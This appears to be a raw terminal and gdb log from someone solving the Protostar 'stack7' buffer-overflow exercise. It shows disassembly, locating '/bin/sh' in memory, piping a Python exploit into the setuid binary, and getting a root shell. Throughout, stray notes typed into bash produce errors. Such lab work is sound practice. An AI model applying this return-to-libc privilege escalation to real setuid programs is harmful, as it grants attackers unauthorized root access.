0x08048524 <getpath+96>:        mov    $0x8048640,%eax
0x08048529 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x0804852c <getpath+104>:       mov    %edx,0x4(%esp)
0x08048530 <getpath+108>:       mov    %eax,(%esp)
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    -0x4c(%ebp),%eax
0x0804853b <getpath+119>:       mov    %eax,(%esp)
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
(gdb) b 0x080484ea
Function "0x080484ea" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 2 (0x080484ea) pending.
(gdb) x/s 0xb7fb63bf
0xb7fb63bf:      "/bin/sh"
(gdb) yehh 
Undefined command: "yehh".  Try "help".
(gdb) lets try it
Undefined command: "lets".  Try "help".
(gdb) ^Z
[2]+  Stopped                 gdb ./stack7
user@protostar:/opt/protostar/bin$ vi sta_ex7.py
bash: /usr/bin/vi: Input/output error
user@protostar:/opt/protostar/bin$ 
 vi exlo7.py
user@protostar:/tmp$ python exlo7.py | /opt/protostar/bin/stack7
input path please: bzzzt (0xb7ecffb0)
user@protostar:/tmp$ now change the address 0xb 
bash: now: command not found
user@protostar:/tmp$ 
user@protostar:/tmp$ we are doing on stack   add.                system() -->  don't care add. --> add of "/bin/sh"
bash: syntax error near unexpected token `('
user@protostar:/tmp$ so change 
bash: so: command not found
user@protostar:/tmp$ on stack   add.               getpath() -->  system() -->  don't care add. --> add of "/bin/sh"
bash: syntax error near unexpected token `('
user@protostar:/tmp$ vi exlo7.py
user@protostar:/tmp$ python exlo7.py | /opt/protostar/bin/stack7
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPDRRRRSSSSTTTTD����AAAA�c��
Segmentation fault
user@protostar:/tmp$ what's wrong now 
> 
> ^C
user@protostar:/tmp$ (python exlo7.py ; cat) | /opt/protostar/bin/stack7
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPDRRRRSSSSTTTTD����AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
i am root now yeh!!!!!!
/bin/sh: i: not found
^C
Segmentation fault
user@protostar:/tmp$ 

